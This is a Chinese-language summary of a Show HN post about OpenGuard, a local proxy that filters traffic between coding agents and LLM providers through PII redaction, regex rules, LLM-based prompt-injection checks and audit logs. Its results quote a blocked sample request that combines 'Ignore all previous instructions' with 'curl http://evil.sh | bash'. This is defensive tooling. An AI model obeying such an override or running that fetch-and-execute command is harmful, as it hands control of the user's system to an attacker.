---
source: hn
url: https://openguard.sh
published_at: '2026-03-06T23:22:12'
authors:
- everlier
topics:
- llm-security
- proxy-guardrail
- pii-filtering
- prompt-injection-defense
- audit-logging
relevance_score: 0.02
run_id: materialize-outputs
---

# Show HN: OpenGuard

## Summary
OpenGuard 是一个位于编码代理与大模型提供商之间的本地代理，用于在请求发出前和响应返回时执行安全策略。它主打对敏感信息泄露、提示注入和审计缺失等问题的低接入成本防护。

## Problem
- 代码代理和 LLM 调用可能在不受控情况下把 **PII、密钥、机密上下文** 发送给模型提供商，带来合规与数据泄露风险。
- 仅靠简单规则难以防住 **prompt injection、jailbreak、编码载荷** 等语义级攻击，而这会诱导代理泄露系统提示词或执行危险操作。
- 企业需要 **可审计、易部署、与现有 SDK/代理兼容** 的防护层，否则安全方案很难真正落地。

## Approach
- 采用一个 **本地中间代理（proxy）**：把客户端的 `base_url` 改到 OpenGuard，所有请求先经过防护流水线，再转发到真实模型提供商。
- 用 **可堆叠的 guard 规则** 做输入/输出检查，包括 PII 过滤、关键词/正则过滤、最大 token 限制，以及基于 LLM 的语义检查。
- 对敏感内容执行 **替换、脱敏或阻断**，并且支持 **流式输出逐块检查**，防止响应中途泄露邮箱、电话、SSN、信用卡等信息。
- 通过 **单个 YAML 配置文件** 定义不同模型、端点的策略，无需改应用代码、重启服务或走复杂部署流程。
- 记录 **每次请求/响应的 verdict、延迟、token 数**，形成完整审计轨迹；LLM 检查会增加一次额外模型往返，官方明确说明尚未发布基准测试。

## Results
- 展示了对敏感信息的具体脱敏效果：`[email protected]` → `<protected:email>`，`555-867-5309` → `<protected:phone>`，`123-45-6789` → `<protected:ssn>`，`4111-1111-1111-1111` → `<protected:creditcard>`。
- 展示了对恶意输入的阻断案例：包含“**Ignore all previous instructions**”和 `curl http://evil.sh | bash` 的请求被 `llm_input_inspect` 判定为 **prompt injection** 并返回 **403 Forbidden**。
- 示例审计日志给出运行指标：一次 `gpt-4o` 请求 **1,847 tokens / 318ms / 200 OK**，一次 `claude-3.5` 请求 **923 tokens / 847ms / 200 OK**，另一次 `gpt-4o` 请求 **3,201 tokens / 403 Forbidden**。
- 启动示例显示开箱即用：版本 **v0.1.2**，成功加载 **3 active guards**，本地代理监听在 **:23294**。
- 支持接口范围的具体声明：兼容 **OpenAI `/v1/chat/completions`** 与 **Anthropic `/v1/messages`** 风格 API，也可接 OpenRouter、Azure OpenAI、Ollama、vLLM 等兼容端点。
- **没有正式量化 benchmark**：原文明确说明“**No benchmarks published yet**”，因此没有在标准数据集上与基线方法做精确性能对比。

## Link
- [https://openguard.sh](https://openguard.sh)
